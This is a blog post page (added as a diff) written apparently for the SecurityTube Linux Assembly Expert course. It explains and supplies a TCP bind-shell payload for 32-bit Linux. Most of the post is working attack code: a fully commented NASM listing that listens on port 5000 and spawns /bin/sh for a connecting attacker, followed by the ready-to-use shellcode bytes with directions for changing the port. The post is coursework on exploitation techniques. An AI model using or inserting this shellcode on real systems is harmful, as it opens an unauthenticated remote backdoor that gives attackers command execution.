@@ -1,0 +1,46 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>1: TCP Bind Shellcode</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-120451103-1');
+</script>
+
+
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="About.html">About</a></p>
+
+<p><a href="Walkthroughs.html">Walkthroughs</a></p>
+
+<ol>
+<li><a href="Walkthroughs--HackTheBox_Jeeves_Walkthrough_and_Lessons.html">HackTheBox: Jeeves Walkthrough and Lessons</a></li>
+<li><a href="Walkthroughs--HackTheBox_Bashed_Walkthrough_and_Lessons.html">HackTheBox: Bashed Walkthrough and Lessons</a></li>
+<li><a href="Walkthroughs--HackTheBox_Chatterbox_Walkthrough_and_Lessons.html">HackTheBox: Chatterbox Walkthrough and Lessons</a></li>
+</ol>
+<p><a href="Courses.html">Courses</a></p>
+
+<ol>
+<li><a href="Courses--SLAE.html">SLAE</a></li>
+<ol>
+<li><a href="Courses--SLAE--1_TCP_Bind_Shellcode.html">1: TCP Bind Shellcode</a></li>
+<li><a href="Courses--SLAE--2_TCP_Reverse_Shell.html">2: TCP Reverse Shell</a></li>
+<li><a href="Courses--SLAE--3_Egghunter_Shellcode.html">3: Egghunter Shellcode</a></li>
+<li><a href="Courses--SLAE--4_Shellcode_Encoding_Scheme.html">4: Shellcode Encoding Scheme</a></li>
+<li><a href="Courses--SLAE--5.1_Metasploit_TCP_Bind_Shellcode_Analysis.html">5.1: Metasploit TCP Bind Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--5.2_Metasploit_chmod_Shellcode_Analysis.html">5.2: Metasploit chmod Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--5.3_Metasploit_exec_Shellcode_Analysis.html">5.3: Metasploit exec Shellcode Analysis</a></li>
+<li><a href="Courses--SLAE--6_Polymorphic_Shellcode.html">6: Polymorphic Shellcode</a></li>
+<li><a href="Courses--SLAE--7_Shellcode_Crypter.html">7: Shellcode Crypter</a></li>
+</ol></ol></div>
+<div class="page"><h1><b><u>1: TCP Bind Shellcode</u></b></h1>In this post, I will show i86 assembly language code and the resultant shellcode used to spawn a TCP bind shell on a 32-bit Linux system. I will also briefly explain the concepts found in the shellcode at a high level.<br /><br /><h2>Bind Shell Shellcode Overview</h2><br />A TCP bind shell is essentially a backdoor placed on a compromised system. The bind shell program, once executed, will listen on an attacker-specified port. When the attacker connects to that port, the program will initialize a command shell such as <strong>sh</strong> or <strong>bash</strong> that the attacker will then be able to send commands to remotely. <br /><br />At a lower level, the shellcode accomplishes this through a series of Linux system calls. In particular, it will call the <strong>socket</strong>, <strong>bind</strong>, <strong>listen</strong>, <strong>accept</strong>, <strong>dup2</strong>, and <strong>execve</strong> system calls in that order to initialize a listening socket that blocks until it accepts a connection, at which point it creates a working shell in the process's memory space. My assembly code listing is below. There are detailed comments explaining the inner workings:<br /><br /><code>; Filename: shellcode.nasm<br />; Author: lastlistener<br />; Purpose: Shellcode that creates a TCP bind shell on a machine. <br /><br />global _start			<br /><br />section .text<br />_start:<br />	xor esi,esi             ; ESI basically used as 0 constant throughout<br />	; eax = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)<br />	push esi                ; IPPROTO_TCP<br />	push byte 1             ; SOCK_STREAM<br />	push byte 2             ; AF_INET<br />	mov ecx,esp             ; address of params<br />	mov al,102              ; syscall number<br />	mov bl,1                ; socketcall number<br />	int 0x80                ; socket()<br />	mov edx,eax             ; save return value<br />	<br />	; bind(socket, INADDR_ANY *sockaddr, sizeof(sockaddr))<br />	; e.g. </code><a href="https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html">https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html</a><code><br />	push esi                ; sockaddr-&gt;family = INADDR_ANY<br />	push word 0x8813				; sockaddr-&gt;port = htons(5000)<br />	push word 2             ; sockaddr-&gt;family = AF_INET<br />	mov ecx,esp             ; ecx = &amp;sockaddr<br /><br />	push 16                 ; sizeof(sockaddr)<br />	push ecx                ; &amp;sockaddr<br />	push edx                ; socket<br />	mov ecx,esp             ; address of arguments<br />	mov al,102              ; syscall number<br />	mov bl,2                ; socketcall number<br />	int 0x80                ; bind()<br /><br />	; listen(socket, backlog 0)<br />	push esi                ; backlog = 0<br />	push edx                ; socket<br />	mov ecx,esp             ; pointer to args<br />	mov al,102              ; syscall number<br />	mov bl,4                ; socketcall number<br />	int 0x80<br /><br />	; eax = accept(socket, NULL *address, NULL address_length)<br />	push esi                ; address = null<br />	push esi                ; length = null<br />	push edx                ; socket<br />	mov ecx,esp             ; pointer to args<br />	mov al,102              ; syscall number<br />	mov bl,5                ; socketcall number<br />	int 0x80<br />	mov edx,eax<br /><br />	; dup2(socket, stdin)<br />	mov al,63<br />	mov ebx,edx<br />	mov ecx,esi<br />	int 0x80<br /><br />	; dup2(socket,stdout)<br />	mov al,63<br />	mov ebx,edx<br />	mov cl,1<br />	int 0x80<br /><br />	; dup2(socket,stderr)<br />	mov al,63<br />	mov ebx,edx<br />	mov cl,2<br />	int 0x80<br /><br />	; execve(filename, argv, env)<br />	push esi<br />	push dword 0x68732f2f   ; hs//<br />	push dword 0x6e69622f   ; nib/<br />	mov ebx,esp             ; filename = /bin/sh<br />	mov al,11               ; syscall number<br />	mov ecx,esi             ; no argv needed<br />	mov edx,esi             ; no env needed<br />	int 0x80</code><br />	<br />	<br />The generated shellcode is as follows. The port can be changed by replacing the bolded bytes with the hexadecimal representation of a port number (default 5000):<br /><br />"\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc2\x56\x66\x68\<strong>x13\x88</strong>\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x56\x52\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x56\x56\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x89\xf1\xcd\x80\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x89\xf1\x89\xf2\xcd\x80"<br /><br /><strong>Note</strong>: My assembly, one of my better skills when I was younger, is quite rusty, and later while reading Metasploit's <strong>linux/x86/shell_bind_tcp</strong> shellcode I realized that my own shellcode is functionally equivalent but quite wasteful (size-wise) in comparison. Metasploit's shellcode contained numerous optimizations such as calling <strong>dup2</strong> in a compact loop to lower the amount of necessary instructions. I did not implement these optimizations in my own code after the fact out of a desire to not copy the work of others for this assignment. <br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div></div>
+</body></html>
